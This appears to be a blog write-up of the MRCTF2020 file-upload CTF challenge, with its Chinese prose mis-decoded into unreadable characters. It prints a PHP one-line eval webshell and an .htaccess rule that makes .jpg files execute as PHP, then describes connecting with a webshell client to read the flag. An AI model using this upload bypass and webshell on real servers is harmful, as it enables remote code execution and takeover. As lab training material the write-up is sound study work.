---
title: MRCTF2020 ä½ ä¼ ä½ ğŸå‘¢ 1
date: 2022-07-13 22:51:42
permalink: /pages/7b6de8/
categories:
  - ç½‘ç»œå®‰å…¨
  - webå®‰å…¨
  - ctfå­¦ä¹ 
tags:
  - 
author: 
  name: jimmy
  link: https://github.com/Riam-jimmy
---
#  MRCTF2020 ä½ ä¼ ä½ ğŸå‘¢ 1

## é¢˜ç›®

![image-20220713190004283](https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131903645.png)

### è§£é¢˜æ€è·¯

* åˆ¤æ–­æ˜¯å¦æœ‰è¿‡æ»¤
* è¿‡æ»¤ä»€ä¹ˆæ–‡ä»¶ï¼Œèƒ½ä¸Šä¼ ä»€ä¹ˆ
* ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬
* èœåˆ€è¿æ¥è·å¾—webshellä»è€Œæ‹¿åˆ°flag

### è§£é¢˜è¿‡ç¨‹

ç›´æ¥ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„phpæ–‡ä»¶çœ‹è¡Œä¸è¡Œ

ä»£ç å¦‚ä¸‹

```php
<?php phpinfo();@eval($_POST['shell']);?>
```

ç„¶åå‡ºç°äº†è¿™ä¸ªé¡µé¢

![image-20220713190924730](https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131909812.png)

å¼€å¯bpæŠ“åŒ…ï¼Œå°†åŒ…å‘é€è‡³repeaterè¯•è¯•éƒ½èƒ½ä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶

![image-20220713191551646](https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131915832.png)

ç»è¿‡å°è¯•å‘ç°pngå›¾ç‰‡æ ¼å¼çš„æœ¨é©¬æ–‡ä»¶ä¹Ÿèƒ½ä¸Šä¼ æˆåŠŸã€‚

ä½†å› ä¸ºè¦æŠŠè¿™ä¸ªphpçš„ä»£ç è§£æå‡ºæ¥ä»è€Œé€šè¿‡èœåˆ€è¿æ¥ï¼Œæ¥ä¸‹æ¥å°±å°è¯•ä¸€ä¸‹çœ‹htaccessæ–‡ä»¶èƒ½å¦ä¸Šä¼ æˆåŠŸ

å…·ä½“åˆ©ç”¨ç»†èŠ‚ï¼š[Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/t/8267)

htaccessæ–‡ä»¶å†…å®¹å¦‚ä¸‹

```
AddType application/x-httpd-php .jpg
```

åŠŸèƒ½æ˜¯å°†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½è§£ææˆphp

å‘ç°.htaccessæ–‡ä»¶èƒ½ä¸Šä¼ ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ç®€å•å¾ˆå¤šäº†ï¼Œç›´æ¥ç”¨èšå‰‘è¿æ¥åå°å°±èƒ½æ‹¿åˆ°flagäº†

![image-20220713193446090](https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131934081.png)

![image-20220713195451747](https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/img/202207131954592.png)